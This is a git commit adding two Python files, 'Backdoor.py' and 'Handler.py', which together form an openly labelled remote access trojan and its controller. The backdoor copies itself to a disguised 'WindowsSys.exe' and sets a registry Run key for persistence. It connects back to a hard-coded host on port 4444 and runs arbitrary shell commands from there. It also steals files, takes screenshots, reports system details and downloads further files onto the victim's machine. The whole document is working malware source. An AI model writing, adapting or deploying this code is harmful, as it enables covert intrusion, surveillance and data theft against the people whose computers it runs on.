9ffbce362f9ae20cc69dc1ecd58549b841208014
Amine Ait Ouazghour <49293816+AmineLelouche@users.noreply.github.com>
2020-03-28 22:09:02 +0100

    Add files via upload

---
+++ Backdoor.py
@@ -0,0 +1,354 @@
+
+try :
+
+	import socket
+	import sys
+	import os
+	import subprocess
+	import random
+	import platform
+	import time
+	import shutil
+	import urllib.request
+
+except :
+	
+	sys.exit()
+
+try :
+ 
+	import pyautogui
+ 
+except :
+ 
+	os.system("pip3 install pyautogui")
+ 
+if platform.system().startswith("Linux") :
+ 
+	red = '\033[91m'
+	green = '\033[92m'
+	yellow = '\033[93m'
+	blue = '\033[94m'
+	endc = '\033[0m'
+	underline = '\033[4m'
+ 
+else :
+
+	red = ''
+	green = ''
+	yellow = ''
+	blue = ''
+	endc = ''
+	underline = ''
+
+def Persistence () :
+
+	try :
+
+		if platform.system().startswith("Win") :
+
+			Location = os.environ["appdata"] + "\\WindowsSys.exe"
+
+			if not os.path.exists(location) :
+
+				shutil.copyfile(sys.executable , Location)
+
+			else :
+
+				pass
+
+			os.system("REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsSys /t REG_SZ /d {}".format(Location))
+
+		else :
+
+			pass
+
+	except Exception :
+
+		pass
+
+def main () : 
+
+	try :
+
+		def Socket_Creation():
+				 
+			try :
+				 
+				global Host
+				global Port
+				global s
+				 
+				s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
+				s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+				s.setblocking(1)
+				
+				Host , Port = "192.168.1.7" , 4444
+				 
+			except socket.error as e :
+				
+				pass
+				 
+		def Socket_Connection():
+				 
+			try :
+				 
+				s.connect((Host , Port))
+				 
+			except socket.error as e :
+				
+				pass
+
+		if __name__ == '__main__':
+
+			Persistence ()
+			Socket_Creation()
+			Socket_Connection()
+				 
+		while True :
+				 
+			Received_Data = s.recv(208400)
+			Decode_Received_Data = Received_Data.decode()
+		 
+			def Current_Working_Directory () :
+		 
+				Cwd = os.getcwd()
+				s.send(str.encode(Cwd))
+		 
+			def Connection_Exit () :
+		 
+				s.close()
+				sys.exit()
+		 
+			def Info () :
+		 
+				_Node = platform.node()
+				_Machine = platform.machine()
+				_System = platform.system()
+				_Release = platform.release()
+				_Version = platform.version()
+				_Architecture = str(platform.architecture()[0])
+				_Language = str(os.getenv("LANG").split(".")[0])
+				s.send(_Node.encode())
+				time.sleep(0.5)
+				s.send(_Machine.encode())
+				time.sleep(0.5)
+				s.send(_System.encode())
+				time.sleep(0.5)
+				s.send(_Release.encode())
+				time.sleep(0.5)
+				s.send(_Version.encode())
+				time.sleep(0.5)
+				s.send(_Architecture.encode())
+				time.sleep(0.5)
+				s.send(_Language.encode())
+		 
+			def Url_Download () :
+		 
+				Sent_Command = "[+] Command Received"
+				s.send(Sent_Command.encode())
+				Received_Url = s.recv(208400)
+				Decode_Received_Url = Received_Url.decode()
+				File_Name = Decode_Received_Url.split("/")[-1]
+		 
+				try :
+		 
+					Url_Open = urllib.request.urlopen(Decode_Received_Url)
+		 
+					with open(File_Name , mode = "wb") as _File :
+						
+						_File.write(Url_Open.read())
+		 
+					if os.path.isfile(File_Name) and os.access(File_Name , os.F_OK) :
+		 
+						time.sleep(1)
+						Checked_Path = "File Has Been Downloaded Over This Url"
+						s.send(Checked_Path.encode())
+		 
+					else :
+		 
+						Checked_Path = "Error File Has Not been Downloaded Correctly"
+						s.send(Checked_Path.encode())
+		 
+				except :
+		 
+					Error_Opened_Error = "Failed To Open This Url"
+					s.send(Error_Opened_Error.encode())
+		 
+			def Download () :
+		 
+				Sent_Command = "[+] Command Received"
+				s.send(Sent_Command.encode())
+		 
+				File_Path = s.recv(208400)
+				Decode_File_Path = File_Path.decode()
+		 
+				if os.access(Decode_File_Path , os.F_OK) and os.path.isfile(Decode_File_Path) :
+		 
+					Path_Confirmation = "Path Found"
+					s.send(Path_Confirmation.encode())
+		 
+					with open (Decode_File_Path , mode = "rb") as _File :
+						
+						Downloaded_File = _File.read(1024)
+						
+						while Downloaded_File :
+							
+							s.send(Downloaded_File)
+							Downloaded_File = _File.read(1024)
+
+						time.sleep(4)
+
+						Finish_Download = "Finish"
+						s.send(str.encode(Finish_Download))
+		 
+				else :
+		 
+					Path_Confirmation = "Path Not Found"
+					s.send(Path_Confirmation.encode())
+
+			def Upload () :
+
+				Sent_Command = "[+] Command Received"
+				s.send(Sent_Command.encode())
+
+				Save_As = s.recv(208400)
+				Decode_Save_As = Save_As.decode()
+
+				if os.path.isdir(Decode_Save_As) :
+
+					if platform.system().startswith("Linux") :
+
+						Decode_Save_As = Decode_Save_As + "/" + "Upload" + str(random.randint(1 , 1000))
+
+					else :
+
+						Decode_Save_As = Decode_Save_As + "\\" + "Upload" + str(random.randint(1 , 1000))
+
+				else :
+
+					pass
+
+				with open(Decode_Save_As , mode = "wb" ) as _File :
+
+					Uploaded_File = s.recv(1024)
+
+					while Uploaded_File :
+
+						_File.write(Uploaded_File)
+						Uploaded_File = s.recv(1024)
+
+						if Uploaded_File == b"Finish" :
+
+							break
+
+				if os.access(Decode_Save_As , os.F_OK) and os.path.isfile(Decode_Save_As) :
+
+					File_Uploaded = "File Uploaded"
+					s.send(File_Uploaded.encode())
+
+				else :
+
+					File_Not_Uploaded = "File Not Uploaded"
+					s.send(File_Not_Uploaded.encode())
+
+			def Screenshot_Capture () :
+				 
+				Sent_Command = "[+] Command Received"
+				s.send(Sent_Command.encode())
+				RandomNum = random.randint(1 , 1000)
+				File_Name = "Screenshot_" + str(RandomNum)
+				
+				pyautogui.screenshot(File_Name)
+
+				time.sleep(0.5)
+
+				with open(File_Name , mode = "rb") as _File :
+
+					_Screenshot = _File.read(1024)
+
+					while _Screenshot :
+
+						s.send(_Screenshot)
+						_Screenshot = _File.read(1024)
+
+					time.sleep(2)
+					
+					Finish_Download = "Finish"
+					s.send(str.encode(Finish_Download))
+
+					time.sleep(5)
+					os.remove(File_Name)
+		 
+			def Interactive_Shell () :
+				 
+				Command_File_Descriptor = subprocess.Popen( Decode_Received_Data
+					, shell = True
+					, stdin = subprocess.PIPE
+					, stdout = subprocess.PIPE
+					, stderr = subprocess.PIPE )
+
+				Output_Bytes = Command_File_Descriptor.stdout.read()  + Command_File_Descriptor.stderr.read()
+				Output_String = str(Output_Bytes , "utf-8")
+
+				Cwd = red + " __[- " + endc + green + socket.gethostname() + endc + red + " -]" + endc + yellow + "~-~" + endc + red + "[" + endc + green + os.getcwd() + endc + red + "]" + red +"\n|__" + endc        
+				s.send(str.encode(endc + "\n" + Output_String + "\n" + green + Cwd))
+		 
+			try :
+				 
+				if Decode_Received_Data[:2] == "cd" :
+					os.chdir(Decode_Received_Data[3:])
+				 
+			except Exception  :
+			   
+				pass
+		 
+			if Decode_Received_Data == "exit" or Decode_Received_Data == "quit" :
+				   
+					Connection_Exit ()
+				 
+			elif Decode_Received_Data == "cwd" :
+				 
+				Current_Working_Directory ()
+				   
+			elif Decode_Received_Data == "screenshot":
+			   
+				Screenshot_Capture ()
+		 
+			elif Decode_Received_Data == "url download" :
+		 
+				Url_Download ()
+		 
+			elif Decode_Received_Data == "download" :
+		 
+				Download ()
+
+			elif Decode_Received_Data == "upload" :
+
+				Upload ()
+
+			elif Decode_Received_Data == "sysinfo" :
+		 
+				Info ()
+				 
+			else :
+			   
+				Interactive_Shell ()
+
+	except Exception as e :
+
+		while True :
+			
+			time.sleep(5)
+			main ()
+
+	except KeyboardInterrupt :
+
+		sys.exit()
+try :
+
+	main ()
+
+except KeyboardInterrupt :
+
+	sys.exit()
---
+++ Handler.py
@@ -0,0 +1,491 @@
+
+try :
+
+	import os
+	import sys
+	import time
+	import platform
+	import socket
+	import random
+
+except :
+
+	print("""
+
+		Execution error:
+
+			You required some basic Python libraries. 
+			This application use : os , sys , time , platform , socket , random .
+			Please, check if you have all of them installed in your system.
+
+		""")
+
+	sys.exit()
+
+if platform.system().startswith("Linux") :
+ 
+	red = '\033[91m'
+	green = '\033[92m'
+	yellow = '\033[93m'
+	blue = '\033[94m'
+	endc = '\033[0m'
+	underline = '\033[4m'
+ 
+else :
+ 
+	red = ''
+	green = ''
+	yellow = ''
+	blue = ''
+	endc = ''
+
+def Banner () :
+ 
+	print (green + '''
+ 
+
+	██╗   ██╗███╗   ███╗██╗     ██████╗ ██╗     ██████╗ 
+	██║   ██║████╗ ████║██║     ╚════██╗██║     ╚════██╗
+	██║   ██║██╔████╔██║██║      █████╔╝██║      █████╔╝
+	╚██╗ ██╔╝██║╚██╔╝██║██║      ╚═══██╗██║      ╚═══██╗
+	 ╚████╔╝ ██║ ╚═╝ ██║███████╗██████╔╝███████╗██████╔╝
+	  ╚═══╝  ╚═╝     ╚═╝╚══════╝╚═════╝ ╚══════╝╚═════╝ 
+													 
+		\033[92m ~{\033[0m Quote  \033[92m: \033[0mLet's Pown \033[92m}~
+		\033[92m ~{\033[0m AMLELE \033[92m: \033[0mVersion 1.0 \033[92m}~
+		\033[92m ~{\033[0m Github \033[92m: \033[0mhttps://github.com/AmineLelouche \033[92m}~                                          
+		''' + endc)
+
+def Socket_Creation () :
+ 
+	try :
+ 
+		global s
+		global Host
+		global Port
+ 
+		s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
+		s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+		s.setblocking(1)
+		
+		Host = ""
+		Port = sys.argv[1]
+
+	except IndexError :
+
+		Port = 4444 # By default
+	 
+	except socket.error as e :
+	   
+		print("")
+		print(red + "[1] Socket Error : " + str(e) + endc)
+
+	except KeyboardInterrupt :
+		
+		print("")
+		print(red + "Exiting ...")
+		time.sleep(1)
+		sys.exit()
+ 
+def Socket_Bind() :
+ 
+	try :
+	   
+		s.bind((Host , Port))
+		s.listen(10)
+		print("")
+		Banner ()
+		print("")
+		time.sleep(0.5)
+		print(green + "[*] " + endc + f"Started At {time.ctime()}")
+		time.sleep(0.5)
+		print(green + "[*] " + endc + f"Listening On {Port} ...")
+ 
+	except socket.error as e :
+	   
+		print("")
+		print(red + "[2] Socket Error : " + str(e) + endc)
+		print("")
+
+		Socket_Bind ()
+
+	except KeyboardInterrupt :
+
+		print("")
+		print(red + "[!] Exiting ...")
+		time.sleep(1)
+		sys.exit()
+ 
+def Socket_Accept():
+ 
+	try :
+ 
+		global Connection
+		global address
+ 
+		Connection , address = s.accept()
+
+		print(green + "[Info] " + endc + "Connection From\033[92m {}\033[0m On Port\033[92m {} ".format(address[0] , address[1]) + endc)
+		print("")
+		time.sleep(0.5)
+		print(green + "<--[ " + endc + "Shell Activated" + green + " ]-->" + endc)
+		time.sleep(0.5)
+		print(green + "<--[ " + endc + "Press help For Display All Commands" + green + " ]-->" + endc)
+		print("")
+		Send_Commands(Connection)
+		Connection.close()
+ 
+	except socket.error as e :
+	   
+		print("")
+		print(red + "[3] Socket Error : " + str(e) + endc)
+
+	except KeyboardInterrupt :
+
+		print("")
+		print(red + "[!] Exiting ...")
+		time.sleep(1)
+		sys.exit()
+
+def Send_Commands(Connection) :
+ 
+	while True :
+ 
+		Commands = input(red + "__" + endc + blue + underline + "Shell " + endc + red + ">" + endc + " ")
+		Commands = Commands.strip()
+		
+		if Commands == "help" :
+ 
+			print("")
+
+			print (green + "Command{0}\t\t\tDescription\n{1}=========\t\t{2}============\n".format(endc , green , endc))
+			print (green + "[+] quit         --> " + endc + "{ Close The Connection }" + endc)
+			print (green + "[+] banner       --> " + endc + "{ Display That Cute Banner }" + endc)
+			print (green + "[+] about        --> " + endc + "{ A Simple Description About The Tool " + endc)
+			print (green + "[+] sysinfo      --> " + endc + "{ Display Info About The Target's Machine }" + endc)                
+			print (green + "[+] cwd          --> " + endc + "{ Display The Current Working Directory } " + endc)
+			print (green + "[+] url download --> " + endc + "{ Download Files into Victims Machine Over Internet }")
+			print (green + "[+] screenshot   --> " + endc + "{ Take A Screenshot }" + endc)
+			print (green + "[+] download     --> " + endc + "{ Download Files From The Target's Machine }" + endc)
+			print (green + "[+] upload       --> " + endc + "{ Upload Files From The Target's Machine }" + endc)
+			
+			print("")
+ 
+		elif Commands == "" :
+ 
+			print("")
+			continue
+
+		elif Commands == "banner" :
+
+			Banner ()
+
+		elif Commands == "about" :
+
+			print("")
+			print (green + "[^] Version     : " + endc + "1.0.0" + endc)
+			print (green + "[^] Author      : " + endc + "Amine Ait Ouazghour" + endc)
+			print (green + "[^] Github      : " + endc + "https://github.com/AmineLelouche" + endc)
+			print (green + "[^] Twitter     : " + endc + "https://twitter.com/aminelelouch" + endc)
+			print (green + "[^] Facebook    : " + endc + "https://www.facebook.com/AmLeleYou01" + endc)
+			print("")
+
+ 
+		elif Commands == "sysinfo" :
+ 
+			Connection.send(Commands.encode())
+			Name = Connection.recv(208400).decode()
+			System = Connection.recv(208400).decode()
+			Machine = Connection.recv(208400).decode()
+			Release = Connection.recv(208400).decode()
+			Version = Connection.recv(208400).decode()
+			Architeture = Connection.recv(208400).decode()
+			language = Connection.recv(208400).decode()
+			
+			print("")
+			
+			print(green + "[.]~{ Name        : " + endc + Name)
+			print(green + "[.]~{ Machine     : " + endc + Machine)
+			print(green + "[.]~{ System      : " + endc + System)
+			print(green + "[.]~{ Release     : " + endc + Release)
+			print(green + "[.]~{ Version     : " + endc + Version)
+			print(green + "[.]~{ Architeture : " + endc + Architeture)
+			print(green + "[.]~{ language    : " + endc + language)
+			
+			print("")
+ 
+		elif Commands == "exit" or Commands == "quit" :
+ 
+			print("")
+			Connection.send(Commands.encode())
+			Connection.close ()
+			s.close ()
+			sys.exit()
+ 
+		elif Commands == "cwd" :
+ 
+			Connection.send(Commands.encode())
+			Received_Data = Connection.recv(208400)
+			Decode_Received_Data = Received_Data.decode()
+			print("")
+			print(green + "[+] You Are Working On : {0}{1}".format(endc , Decode_Received_Data))
+			print("")
+ 
+		elif Commands == "url download" :
+
+			print("")
+
+			print("[+] Sending Command")
+			time.sleep(1)
+			Connection.send(Commands.encode())
+			Received_Confirmation = Connection.recv(208400)
+			print(Received_Confirmation.decode())
+				
+			Loop = True
+			File_Url = str(input(green + "[+] File Url : " + endc))
+			
+			while Loop :
+				
+				if File_Url == "" :
+				
+					print(red + "[!] Empty Input ... Please Try Again !!" + endc)
+					time.sleep(0.5)
+					File_Url = str(input(green + "[+] File Url : " + endc))
+				
+				else :
+				
+					Loop = False
+				
+			Connection.send(File_Url.encode())
+				
+			Url_Check = Connection.recv(208400)
+			Decode_Url_Check = Url_Check.decode()
+				
+			if Decode_Url_Check == "File Has Been Downloaded Over This Url" :
+				
+				time.sleep(0.5)
+				print(green + "[+] " + endc + "{}".format(Decode_Url_Check))
+				
+			else :
+				
+				time.sleep(0.5)
+				print(red + "[!] {}".format(Decode_Url_Check))
+				
+			print("")
+
+		elif Commands == "download" :
+
+
+			print("")
+			print("[+] Sending Command")
+			time.sleep(1)
+			Connection.send(Commands.encode())
+			Received_Confirmation = Connection.recv(208400)
+			print(Received_Confirmation.decode())
+			
+			Loop = True
+			File_Path = str(input(green + "[+] Path_file : " + endc))
+
+			while Loop :
+
+				if File_Path == "" :
+
+					print(red + "[!] Empty Input ... Please Try Again !!" + endc)
+					time.sleep(0.5)
+					File_Path = str(input(green + "[+] Path_file : " + endc))
+
+				else :
+
+					Loop = False
+			
+			Connection.send(File_Path.encode())
+				
+			Recv_Path_Confirmation = Connection.recv(208400)
+			Decod_Recv_Path_Confirmation = Recv_Path_Confirmation.decode()
+
+			if Decod_Recv_Path_Confirmation == "Path Found" :
+
+				if not os.path.exists("Downloads") :
+
+					os.mkdir("Downloads")
+
+				else :
+
+					pass
+
+				if platform.system().startswith("Linux") :
+
+					Save_As = "Downloads/" + "Download" + str(random.randint(1 , 1000))
+
+				else :
+
+					Save_As = "Downloads\\" + "Download_" + str(random.randint(1 , 1000))
+				
+				with open (Save_As , mode = "wb") as _File :
+						
+					Received_Data = Connection.recv(1024)
+						
+					while Received_Data :
+							
+						_File.write(Received_Data)
+						Received_Data = Connection.recv(1024)
+
+						if Received_Data == b"Finish" :
+							
+							break
+
+				if os.access(Save_As , os.F_OK) and os.path.isfile(Save_As) :
+				
+					print(yellow + "[+] " + endc + "File Has Been Downloaded Succefully " )
+					time.sleep(0.5)
+					print(green + "[+] " + endc + "Path : {} ".format(Save_As))
+					print(green + "[+] " + endc + "Size : {} ".format(os.path.getsize(Save_As)) + "Bytes")
+				
+				else :
+				
+					print(red + "[!] File Has Not Been Downloaded")
+				
+			else :
+				
+				time.sleep(1)
+				print(red + "[!] Error While Downloding Path , Path It Might Not Be Exist")
+				
+			print("")
+
+		elif Commands == "upload" :
+
+			print("")
+			print("[+] Sending Command ...")
+			time.sleep(1)
+			Connection.send(Commands.encode())
+			Received_Confirmation = Connection.recv(208400)
+			print(Received_Confirmation.decode())
+
+			File_Path = str(input(green + "[+] File Path : " + endc))
+			Loop = True
+
+			while Loop :
+
+				if os.access(File_Path , os.F_OK) and os.path.isfile(File_Path) :
+
+					Loop = False
+
+				else :
+
+					print(red + "[!] File Not Found ... Try Again !!" + endc)
+					File_Path = str(input(green + "[+] File Path : " + endc))
+
+			Save_As =  str(input(green + "[+] Save_As : " + endc))
+
+			while Loop :
+
+				if Save_As == "" :
+
+					print(red + "[!] Empty Input ... Please Try Agin !!" + endc)
+					time.sleep(0.5)
+					Save_As = str(input(green + "[+] Save_As : " + endc))
+
+				else :
+
+					Loop = False
+
+			Connection.send(Save_As.encode())
+
+			with open(File_Path , mode = "rb") as _File :
+
+				Uploaded_File = _File.read(1024)
+
+				while Uploaded_File :
+
+					Connection.send(Uploaded_File)
+					Uploaded_File = _File.read(1924)
+
+				time.sleep(2)
+
+				Finish_Upload = "Finish"
+				Connection.send(Finish_Upload.encode())
+
+				Received_Upload_Confirmation = Connection.recv(208400)
+				Decode_Received_Upload_Confirmation = Received_Upload_Confirmation.decode()
+
+				if Decode_Received_Upload_Confirmation == "File Uploaded" :
+
+					print(yellow + "[+] " + endc + "File Has Been Uploaded")
+					print(green + "[+] " + endc + "Path : {} ".format(Save_As))
+					print(green + "[+] " + endc + "Size : {} ".format(os.path.getsize(Save_As)) + "Bytes")
+					print("")
+
+				else :
+
+					print(red + "[!] Error While Uploading The File" + endc)
+					print("")
+
+
+		elif Commands == "screenshot" :
+
+
+			print("")
+			print("[+] Sending Command ...")
+			time.sleep(1)
+			Connection.send(Commands.encode())
+			Received_Confirmation = Connection.recv(208400)
+			print(Received_Confirmation.decode())
+
+			RandomNum = random.randint(1 , 1000)
+			File_Name = "Screenshot_" + str(RandomNum)
+
+			if not os.path.exists("Screenshots") :
+
+				os.mkdir("Screenshots")
+
+			else :
+
+				pass
+
+			if platform.system().startswith("Linux") :
+
+				File_Path = "Screenshots/" + File_Name
+
+			else :
+
+				File_Path = "Screenshots\\" + File_Name
+
+			with open(File_Path , mode = "wb") as _File :
+
+				Received_Data = Connection.recv(1024)
+					
+				while Received_Data :
+
+					_File.write(Received_Data)
+					Received_Data = Connection.recv(1024)
+
+					if Received_Data == b"Finish" :
+							
+						break
+
+
+			if os.access(File_Path , os.F_OK) and os.path.isfile(File_Path):
+					
+				print(yellow + "[+] " + endc + "Screenshot Has Been Saved " + endc)
+				time.sleep(0.5)
+				print(green + "[+] " + endc + "Path : {0} ".format(File_Path))
+				print(green + "[+] " + endc + "Size : {0} ".format(os.path.getsize(File_Path)) + "Bytes")
+				
+			else :
+				
+				print(red + "[!] Screenshot Is Not Saved " + endc)
+				
+			print("")
+		   
+		else :
+ 
+			Connection.send(Commands.encode())
+			Output_Command = Connection.recv(208400).decode("utf-8")
+			Output_String = str(Output_Command)
+			print(Output_String , end = "")
+ 
+if __name__ == '__main__':
+   
+	Socket_Creation ()
+	Socket_Bind ()
+	Socket_Accept ()
